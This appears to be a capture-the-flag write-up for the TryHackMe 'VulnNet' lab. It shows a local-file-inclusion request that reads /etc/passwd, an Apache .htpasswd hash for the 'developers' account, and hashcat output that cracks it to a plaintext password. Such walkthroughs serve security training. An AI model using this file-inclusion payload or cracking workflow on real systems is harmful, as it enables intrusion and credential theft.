<code>

  ## VulnNet
  
LINK : https://tryhackme.com/room/vulnnet1


GET http://vulnnet.thm/index.php?referer=//etc/passwd HTTP/1.1

Looking at the above screenshot we see that the credential for the broadcast.vulnnet.thm is stored in

/etc/apache2/.htpasswd


 developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0

D:\__Instal\____tryhackme_tools\hashcat-6.2.6>hashcat.exe -m 1600 hash2.txt rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
=============================================================
* Device #1: Intel(R) UHD Graphics 630, 6432/12965 MB (2047 MB allocatable), 24MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1475 MB

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:9972761drmfsls

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
Time.Started.....: Mon Jun 02 12:51:22 2025 (9 mins, 44 secs)
Time.Estimated...: Mon Jun 02 13:01:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     3749 H/s (17.72ms) @ Accel:4 Loops:3 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2187264/14344385 (15.25%)
Rejected.........: 0/2187264 (0.00%)
Restore.Point....: 2162688/14344385 (15.08%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:999-1000
Candidate.Engine.: Device Generator
Candidates.#1....: Angelica6 -> 8891137

Started: Mon Jun 02 12:51:02 2025
Stopped: Mon Jun 02 13:01:08 2025

## $apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:9972761drmfsls

</code>
